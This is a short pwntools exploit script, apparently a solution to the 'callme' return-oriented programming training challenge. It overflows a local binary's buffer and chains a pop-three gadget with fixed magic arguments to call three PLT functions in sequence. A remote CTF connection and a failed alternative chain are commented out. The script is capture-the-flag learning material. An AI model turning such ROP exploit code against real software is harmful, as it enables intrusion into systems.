from pwn import *
from pwn import p64
import socket
from ctypes import *
context(arch='amd64', os='linux', log_level='DEBUG')

# host = "node.yuzhian.com.cn"
# ip = socket.gethostbyname(host)
# r = remote(ip,37506)#远程连接
# elf = cdll.LoadLibrary('./libcallme32.so')
r = process("./callme")
addr_one_plt = 0x400720
addr_two_plt = 0x400740
addr_three_plt = 0x4006f0

a1 = 0x0DEADBEEFDEADBEEF
a2 = 0x0CAFEBABECAFEBABE
a3 = 0x0D00DF00DD00DF00D

pop3_addr = 0x040093c
ret_addr = 0x04006be

payload = b'A' * 0x20 + b'junkjunk'

payload += p64(pop3_addr)+p64(a1) + p64(a2) + p64(a3) + p64(ret_addr) + p64(addr_one_plt)

payload += p64(pop3_addr)+p64(a1) + p64(a2) + p64(a3) + p64(ret_addr) + p64(addr_two_plt)

payload += p64(pop3_addr)+p64(a1) + p64(a2) + p64(a3) + p64(ret_addr) + p64(addr_three_plt)

# 64位传参plt

# pause()

# addr_one = 0x040092D
# addr_two = 0x0400919
# addr_three = 0x0400905

# payload = b'A' * 0x20 + b'junkjunk'

# payload += p64(pop3_addr)+p64(a1) + p64(a2) + p64(a3) + p64(addr_one)

# payload += p64(pop3_addr)+p64(a1) + p64(a2) + p64(a3) + p64(addr_two)

# payload += p64(pop3_addr)+p64(a1) + p64(a2) + p64(a3) + p64(addr_three)

# 因为有exit() 方法不通过

r.sendlineafter(b">", payload)

r.interactive()
